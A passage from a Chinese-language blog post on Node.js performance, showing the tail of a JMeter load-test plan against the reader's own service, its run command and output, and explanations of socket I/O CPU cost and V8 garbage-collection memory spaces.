          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.domain<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>the_ip_of_your_service<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.port<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>8000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.protocol<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.contentEncoding<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.path<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>GET<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.follow_redirects<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.auto_redirects<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.use_keepalive<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.DO_MULTIPART_POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.embedded_url_re<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.connect_timeout<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.response_timeout<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTTPSamplerProxy</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ResultCollector</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ViewResultsFullVisualizer<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ResultCollector<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>View Results Tree<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ResultCollector.error_logging<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>objProp</span><span class="token punctuation">></span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>saveConfig<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SampleSaveConfiguration<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>time</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>time</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>latency</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>latency</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>timestamp</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>timestamp</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>success</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>success</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>threadName</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>threadName</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataType</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataType</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoding</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoding</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assertions</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>assertions</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>subresults</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>subresults</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>responseData</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>responseData</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>samplerData</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>samplerData</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xml</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xml</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fieldNames</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fieldNames</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>responseHeaders</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>responseHeaders</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>requestHeaders</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>requestHeaders</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>responseDataOnError</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>responseDataOnError</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>saveAssertionResultsFailureMessage</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>saveAssertionResultsFailureMessage</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assertionsResultsToSave</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>assertionsResultsToSave</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bytes</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bytes</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sentBytes</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sentBytes</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>threadCounts</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>threadCounts</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>idleTime</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>idleTime</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>connectTime</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>connectTime</span><span class="token punctuation">></span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>objProp</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ResultCollector</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">/></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ResultCollector</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SummaryReport<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ResultCollector<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Summary Report<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ResultCollector.error_logging<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>objProp</span><span class="token punctuation">></span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>saveConfig<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SampleSaveConfiguration<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>time</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>time</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>latency</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>latency</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>timestamp</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>timestamp</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>success</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>success</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>threadName</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>threadName</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataType</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataType</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoding</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoding</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assertions</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>assertions</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>subresults</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>subresults</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>responseData</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>responseData</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>samplerData</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>samplerData</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xml</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xml</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fieldNames</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fieldNames</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>responseHeaders</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>responseHeaders</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>requestHeaders</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>requestHeaders</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>responseDataOnError</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>responseDataOnError</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>saveAssertionResultsFailureMessage</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>saveAssertionResultsFailureMessage</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assertionsResultsToSave</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>assertionsResultsToSave</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bytes</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bytes</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sentBytes</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sentBytes</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>threadCounts</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>threadCounts</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>idleTime</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>idleTime</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>connectTime</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>connectTime</span><span class="token punctuation">></span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>objProp</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ResultCollector</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hashTree</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hashTree</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hashTree</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hashTree</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jmeterTestPlan</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.2.1 single.jmx</strong></p>
<p>第 41 行中 <code>HTTPSampler.use_keepalive</code> 属性设置为 true，这样就能使用 http 1.1 的 keepalive 属性，我们将其设置为 <code>true</code>，这也是 JMeter 的默认值。如果改为 false，就会频繁创建 socket 句柄的问题，有可能把机器的句柄数跑满。</p>
<blockquote>
<p>在压测开始后，通过运行命令 <code> netstat -antp | grep 8000 | grep ESTABLISHED | wc -l</code> 会发现输出 <code>16</code>，这是由于我们启用了 keepalive，且压测端开启了 16 个线程。线程数是在 21 行 <code>ThreadGroup.num_threads</code> 属性设置的。</p>
</blockquote>
<p>第 33 行中的 <code>HTTPSampler.domain</code> 属性要设置为 <strong>代码 1.1.3</strong> 启动的服务的 IP 地址。</p>
<p>我们使用命令 </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bin/jmeter.sh -n -t the_path_of_single.jmx -l /tmp/single.jtl -e -o /tmp/single.out<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>命令 1.2.1</strong></p>
<p>即可发起对于服务端的压测，正常情况下 JMeter 应该会有如下输出：</p>
<pre class="line-numbers language-none"><code class="language-none">Creating summariser &lt;summary&gt;
Created the tree successfully using ..&#x2F;single.jmx
Starting standalone test @ Tue Nov 30 14:16:19 CST 2021 (1638252979737)
Waiting for possible Shutdown&#x2F;StopTestNow&#x2F;HeapDump&#x2F;ThreadDump message on port 4445
Warning: Nashorn engine is planned to be removed from a future JDK release
summary + 118675 in 00:00:10 &#x3D; 11953.6&#x2F;s Avg:     1 Min:     0 Max:    50 Err:     0 (0.00%) Active: 16 Started: 16 Finished: 0
summary + 382998 in 00:00:30 &#x3D; 12766.6&#x2F;s Avg:     1 Min:     0 Max:    18 Err:     0 (0.00%) Active: 16 Started: 16 Finished: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这就代表压测成功了。</p>
<p>然后我们发现，服务端的 CPU 已经 100%了，那么到底是什么原因导致其 CPU 跑满呢？通过 CPU 火焰图可以发现 socket 写入比较耗时。</p>
<p><img src="/images/image-20211130143113406.png" alt="image-20211130143113406"><strong>图 1.2.1</strong></p>
<p>其实一个完整的 HTTP 请求的处理，还包括 socket 原始数据包，读取后还解析其中的内容。前者是在 libuv 中的poll 阶段完成，后者在 Node 中是使用原生库 <a href="https://github.com/nodejs/llhttp">llhttp</a> 实现的，这两者都是运行在原生代码中，所以要算到 <code>(program)</code> 中。但是服务器端处理完数据后，调用 <code>end</code> 函数触发 socket 写入的时候，是在 Node 端显式调用的，所以我们在火焰图中可以清晰的看到。</p>
<blockquote>
<p>从上面的分析可以推断出，socket 的读是要比写要轻量的。这是由于对于读操作从内核态中读取出来的数据，是已经做完协议栈解析后的数据；而写操作，并不是仅仅将原数据写到内核态的缓冲区就完事了，而是还要走一遍协议栈封包，组装完成后，如果当前允许发送则直接发送，否则写入内部队列。具体参见 <a href="https://ty-chen.github.io/linux-kernel-tcp-receive/">网络通信之收包</a> 和 <a href="https://ty-chen.github.io/linux-kernel-tcp-send/">网络通信之发包</a> 。</p>
<p>socket 的读是要比写要轻量是建立在同级别数据包大小的情况下，如果服务端处理上传的大文件，必然会耗费大量的 CPU 时间用在读上。</p>
</blockquote>
<p>socket 读写需要做系统调用，需要损耗 CPU ，不管你使用任何编程语言，都无可避免，但是碍于 Node 的单线程机制，IO 操作和用户的 js 代码逻辑在一个线程中，必然会相互挤占资源。所以对于程序中的一些不必要的 IO 处理，比如说打日志（包括控制台日志）、上报打点之类的操作，尽量做到定时批量操作，让出更多的 CPU 时间给逻辑代码。</p>
<blockquote>
<p>关于异步日志打印的库，可以参见笔者的 <a href="https://www.npmjs.com/package/node-slogger">node-slogger</a> 包。</p>
</blockquote>
<h3 id="1-3-保守的-GC-参数"><a href="#1-3-保守的-GC-参数" class="headerlink" title="1.3 保守的 GC 参数"></a>1.3 保守的 GC 参数</h3><p>编程语言的内存一般分为 栈（Stack）和 堆（Heap）两部分，JavaScript 的内存也是这种布局。其中 栈 用来存储函数的执行的上下文和字面量类型的值（数字、字符串、布尔、指针等类型）。堆 用来存储对象（Array Object Function 等类型）。堆又会被划分为 <code>新生代（New space）</code> <code>老生代（Old space）</code> <code>大对象空间（Large object space）</code> <code>代码空间（Code space）</code> ，同时还包括存储隐藏类相关的数据的区域 （下图中的 <code>Cell space</code> <code>Property cell space</code> <code>Map space</code> ）。对于 GC 来说，我们需要关心的仅仅只有 <code>新生代</code> 和 <code>老生代</code>。</p>
<p><img src="/images/kSgatSL.png" alt="🚀 Visualizing memory management in V8 Engine (JavaScript, NodeJS, Deno, WebAssembly)"></p>
<p><strong>图 1.3.1</strong></p>
<p>JavaScript 中新建一个对象，默认进入新生代（除非这个对象超大，新生代和老生代装不下，这种大对象会进入 <code>大对象空间</code>）。新生代分为 <code>Used</code> 和 <code>Inactive</code> 两个区块（上图中的两个 <code>Semi space</code> 区块，这两个区块也通常被称之为 <code>From</code> 和 <code>To</code> 区块），新分配的对象会分配到 <code>Used</code> 区块。当 <code>Used</code> 区块满时，会强制触发一次新生代的 GC，GC 收集器会扫描 <code>Used</code> 区块，找到还在使用的对象拷贝到 <code>Inactive</code> 区块，当 <code>Used</code> 区块中所有对象扫描完成后，<code>Used</code> 就是一块清空的区块了，最后交换 <code>Used</code> 和 <code>Inactive</code> 两个区块，现在新的 <code>Used</code> 块就变成了原来的那个 <code>Inactive</code> 块。</p>
